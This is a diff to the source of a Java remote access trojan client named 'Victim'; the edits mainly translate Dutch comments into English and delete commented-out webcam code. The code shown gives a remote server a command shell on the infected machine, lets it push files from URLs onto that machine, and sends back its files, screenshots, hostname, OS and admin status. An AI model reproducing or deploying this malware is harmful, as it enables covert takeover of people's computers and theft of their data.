@@ -37,13 +37,13 @@ public class Victim implements Runnable {
 
     public static void main(String[] args) throws UnknownHostException, InterruptedException {
 
-        // The default port
+        // The default port and ip
         int port_number = 4600;
         String host = "localhost";
 
         String hostname = InetAddress.getLocalHost().getHostName(); // find the hostname from computer
         try {
-            URL whatismyip = new URL("http://checkip.amazonaws.com"); // checkt the external ip from the computer.
+            URL whatismyip = new URL("http://checkip.amazonaws.com"); // check the external ip from the computer.
             BufferedReader in = new BufferedReader(new InputStreamReader(
                     whatismyip.openStream()));
             ip = in.readLine();
@@ -71,12 +71,12 @@ public class Victim implements Runnable {
                 new Thread(new Victim()).start();
 
                 while (!closed) {
-                    // lees een regel text.
+                    // read line text.
                     int a = 'a';
                     String s = "";
                     long begin = System.currentTimeMillis();
                     do {
-                        if (System.currentTimeMillis() - begin > 10000) {
+                        if (System.currentTimeMillis() - begin > 10000) { // keepalive massage
                             begin = System.currentTimeMillis();
                             os.println("ping");
                         }
@@ -106,33 +106,33 @@ public class Victim implements Runnable {
         try {
             while ((responseLine = is.readLine()) != null) {
                 System.out.println(responseLine);
-                if (responseLine.contains(whoami + "shell ")) {
+                if (responseLine.contains(whoami + "shell ")) { // send shell request
                     //int i = whoami.length() * 2 + 8;
                     int i = whoami.length() + 15;
                     String s = responseLine.substring(i);
                     os.println(ExecuteMyCommand(responseLine.substring(i)));
                 }
-                if (responseLine.contains(whoami + "upload ")) {
+                if (responseLine.contains(whoami + "upload ")) { // upload file to victim
                     //int i = whoami.length() * 2 + 8;
                     int i = whoami.length() + 16;
                     String s = responseLine.substring(i);
                     os.println("location of file is: " + upload(s));
                 }
-                if (responseLine.contains(whoami + "javaversion")) {
+                if (responseLine.contains(whoami + "javaversion")) { // request javaversion only not jre or jdk with it.
                     os.println("java version from " + whoami + " is: " + System.getProperty("java.version"));
                 }
-                if (responseLine.contains(whoami + "download ")) {
+                if (responseLine.contains(whoami + "download ")) { // download a file from the victim to the server.
                     //int i = whoami.length() * 2 + 8;
                     int i = whoami.length() + 18;
                     String s = responseLine.substring(i);
                     os.println("downloadeble file = " + download(s));
                 }
 
-                if (responseLine.contains(whoami + "screenshot")) {
+                if (responseLine.contains(whoami + "screenshot")) { // request screenshot from victim.
                     os.println("screenshot: " + screenshot());
                 }
 
-                if (responseLine.contains(whoami + "msgbox")) {
+                if (responseLine.contains(whoami + "msgbox")) { // send a popup message to victim.
                     try {
                         int i = whoami.length() + 16;
                         String s = responseLine.substring(i);
@@ -153,7 +153,7 @@ public class Victim implements Runnable {
                     }
                 }
 
-                if (responseLine.contains("list info")) {
+                if (responseLine.contains("list info")) { // request many things from victim like: ip, hostname, OS, and admin or not if windows.
                     if (OS.contains("windows")) {
                         if (isAdmin() == true) {
                             os.println("online " + whoami + " = " + OS + " admin?= administrator");
@@ -166,7 +166,7 @@ public class Victim implements Runnable {
 
                 }
 
-                if (responseLine.contains(whoami + "exit")) {
+                if (responseLine.contains(whoami + "exit")) { // close connection remotely
                     System.exit(0);
 
                 }
@@ -183,11 +183,11 @@ public class Victim implements Runnable {
         closed = true;
     }
 
-    public static String ExecuteMyCommand(String commando) { // hier sturen we ons command ( voorbeeld "dir" als commando)
+    public static String ExecuteMyCommand(String commando) { // here send we our command ( example "dir" as a command)
 
         try {
             if (commando.length() < 1) {
-                return "Geen commndo probeer opnieuw.";
+                return "no command try retry";
             }
             String outputlines = "";
             if (OS.contains("windows")) {
@@ -196,7 +196,7 @@ public class Victim implements Runnable {
 
                 String regel = "";
                 while ((regel = br.readLine()) != null) {
-                    outputlines += regel + "\n"; // System.err.println(regel);
+                    outputlines += regel + "\n"; 
                 }
                 return outputlines;
             }
@@ -205,7 +205,7 @@ public class Victim implements Runnable {
 
             String regel = "";
             while ((regel = br.readLine()) != null) {
-                outputlines += regel + "\n"; // System.err.println(regel);
+                outputlines += regel + "\n"; 
             }
             return outputlines;
 
@@ -214,7 +214,7 @@ public class Victim implements Runnable {
         }
     }
 
-    public static boolean isAdmin() { // checken of de user een administrator is. werkt alleen met windows
+    public static boolean isAdmin() { // check if were are heve admin acces.
         String groups[] = (new com.sun.security.auth.module.NTSystem()).getGroupIDs();
         for (String group : groups) {
             if (group.equals("S-1-5-32-544")) {
@@ -224,7 +224,7 @@ public class Victim implements Runnable {
         return false;
     }
 
-    public static String upload(String file) throws IOException { // uploaden naar victim via url
+    public static String upload(String file) throws IOException { // uploaden to victim from url.
         temp = File.createTempFile("temp", Long.toString(System.nanoTime()));
         URL url = new URL(file);
         InputStream in = url.openStream();
@@ -234,7 +234,7 @@ public class Victim implements Runnable {
 
     }
 
-    public static String download(String file) throws IOException { // downloaden van victim naar server
+    public static String download(String file) throws IOException { // download from victim to server.
         try {
             File ziptemp = File.createTempFile("temp", Long.toString(System.nanoTime()));
             Path fileLocationzip = Paths.get(ziptemp.toString());
@@ -267,7 +267,7 @@ public class Victim implements Runnable {
         return "";
     }
 
-    public static String screenshot() throws IOException, AWTException { // een screenshot nemen van het standart scherm en sturen naar server.
+    public static String screenshot() throws IOException, AWTException { // request screenshot from default screen from victim.
         temp = File.createTempFile("temp", Long.toString(System.nanoTime()));
         File ziptemp = File.createTempFile("temp", Long.toString(System.nanoTime()));
         Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
@@ -296,68 +296,7 @@ public class Victim implements Runnable {
         byte[] data = Files.readAllBytes(fileLocationzip);
         String base64encoded = Base64.getEncoder().encodeToString(data);
         return base64encoded;
-//
-//        
-//        
+      
 
     }
-    
-
-//    public static String webcamshot() throws IOException, AWTException {
-//        temp = File.createTempFile("temp", Long.toString(System.nanoTime()));
-//
-//        // not compleet here the picture placing!
-//        File ziptemp = File.createTempFile("temp", Long.toString(System.nanoTime()));
-//        Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
-//        BufferedImage capture = new Robot().createScreenCapture(screenRect);
-//        ImageIO.write(capture, "bmp", new File(temp.toString()));
-//        Path fileLocationzip = Paths.get(ziptemp.toString());
-//        // input file 
-//        FileInputStream in = new FileInputStream(temp);
-//
-//        // out put file 
-//        ZipOutputStream out = new ZipOutputStream(new FileOutputStream(ziptemp));
-//
-//        // name the file inside the zip  file 
-//        out.putNextEntry(new ZipEntry("webcamshot.png"));
-//
-//        // buffer size
-//        byte[] b = new byte[1024];
-//        int count;
-//
-//        while ((count = in.read(b)) > 0) {
-//            out.write(b, 0, count);
-//        }
-//        out.close();
-//        in.close();
-//
-//        byte[] data = Files.readAllBytes(fileLocationzip);
-//        String base64encoded = Base64.getEncoder().encodeToString(data);
-//        return base64encoded;
-//
-//        
-//        
-
-    
-
-//    public static void Base64DecodeAndExtractZip(String a) throws IOException {
-//        temp = File.createTempFile("temp", Long.toString(System.nanoTime()));
-//        byte[] Decoded = Base64.getDecoder().decode(a);
-//        FileOutputStream fos = new FileOutputStream(temp);
-//        fos.write(Decoded);
-//        fos.close();
-//        System.out.println("location of file or picture: " + zipextract(temp.toString()));
-//    }
-//
-//    public static String zipextract(String z) {
-//        File dir = new File(temp + "folder");
-//        try {
-//            ZipFile zipFile = new ZipFile(temp.getAbsolutePath());
-//            zipFile.extractAll(temp.getAbsolutePath() + "folder");
-//        } catch (ZipException e) {
-//            e.printStackTrace();
-//        }
-//        return temp + "folder";
-//    }
-
 }
